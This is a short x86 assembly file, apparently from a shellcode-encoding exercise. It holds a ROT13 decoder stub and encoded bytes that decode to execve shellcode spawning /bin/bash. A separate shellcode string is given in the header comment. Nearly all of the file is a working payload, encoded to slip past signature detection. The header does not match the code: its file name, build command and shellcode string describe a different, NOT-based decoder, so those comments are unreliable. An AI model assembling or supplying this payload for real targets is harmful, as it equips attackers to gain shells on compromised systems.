; Rot13ExecveSh.asm
; by Abatchy
;
;   nasm -felf32 NOTExecveBashStack.asm && ld -o NOTExecveBashStack NOTExecveBashStack.o
; Generated shellcode: "\xeb\x0c\x5e\x8a\x06\xf6\x16\xfe\xc0\x74\x08\x46\xeb\xf5\xe8\xef\xff\xff\xff\xce\x3f\xaf\x97\x9d\x9e\x8c\x97\x97\x9d\x96\x91\xd0\x97\xd0\xd0\xd0\xd0\x76\x1c\xaf\x76\x1d\xac\x76\x1e\x4f\xf4\x32\x7f\xff"

global _start

section .text

_start:
    
    jmp short get_shellcode_addr

ReturnLabel:
    pop esi

decode:
    sub byte [esi], 13
    jz shellcode
    inc esi
    jmp short decode

get_shellcode_addr:
    call ReturnLabel
    shellcode: db  0x3e, 0xcd, 0x5d, 0x75, 0x6f, 0x6e, 0x80, 0x75, 0x75, 0x6f, 0x76, 0x7b, 0x3c, 0x75, 0x3c, 0x3c, 0x3c, 0x3c, 0x96, 0xf0, 0x5d, 0x96, 0xef, 0x60, 0x96, 0xee, 0xbd, 0x18, 0xda, 0x8d, 0x0d
    